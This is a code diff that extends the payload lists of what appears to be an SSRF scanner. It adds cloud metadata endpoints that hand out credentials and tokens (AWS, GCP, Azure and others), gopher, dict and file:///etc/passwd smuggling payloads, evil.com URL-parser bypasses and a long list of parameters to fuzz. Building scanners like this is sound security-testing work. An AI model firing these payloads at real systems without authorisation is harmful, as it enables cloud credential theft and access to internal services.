@@ -9,22 +9,47 @@ TARGETS = [
     # AWS
     "http://169.254.169.254/latest/meta-data/",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://169.254.169.254/latest/user-data/",
     # GCP
     "http://metadata.google.internal/computeMetadata/v1/",
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     # Azure
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
     # Alibaba
     "http://100.100.100.200/latest/meta-data/",
     # DigitalOcean
     "http://169.254.169.254/metadata/v1/",
+    # Oracle Cloud
+    "http://169.254.169.254/opc/v1/instance/",
+    "http://169.254.169.254/opc/v2/instance/",
+    # IBM Cloud
+    "http://169.254.169.254/metadata/v1/instance",
+    # Tencent Cloud
+    "http://metadata.tencentyun.com/latest/meta-data/",
+    # Huawei Cloud
+    "http://169.254.169.254/openstack/latest/meta_data.json",
     # Internal services
     "http://127.0.0.1/",
     "http://localhost/",
     "http://192.168.0.1/",
+    "http://192.168.1.1/",
     "http://10.0.0.1/",
+    "http://172.16.0.1/",
+    "http://0.0.0.0/",
     # Protocol smuggling
     "gopher://127.0.0.1:6379/_INFO",
     "file:///etc/passwd",
+    "dict://127.0.0.1:6379/info",
+    "ftp://127.0.0.1/",
+    # URL parser bypasses
+    "http://127.0.0.1@evil.com/",
+    "http://evil.com#@127.0.0.1/",
+    "http://127.0.0.1%2f@evil.com/",
+    "http://[::1]/",
+    "http://0177.0.0.1/",
+    "http://2130706433/",
+    "http://0x7f000001/",
 ]
 
 # Specific indicators that only appear in actual internal/cloud responses
@@ -38,6 +63,9 @@ SSRF_INDICATORS = (
 PARAMS = [
     "url", "next", "redirect", "dest", "target", "uri", "callback",
     "path", "src", "source", "href", "link", "image", "file", "doc",
+    "proxy", "forward", "fetch", "load", "request", "webhook", "endpoint",
+    "api_url", "service", "host", "domain", "server", "feed", "data",
+    "resource", "site", "html", "page", "ref", "reference",
 ]
 
 
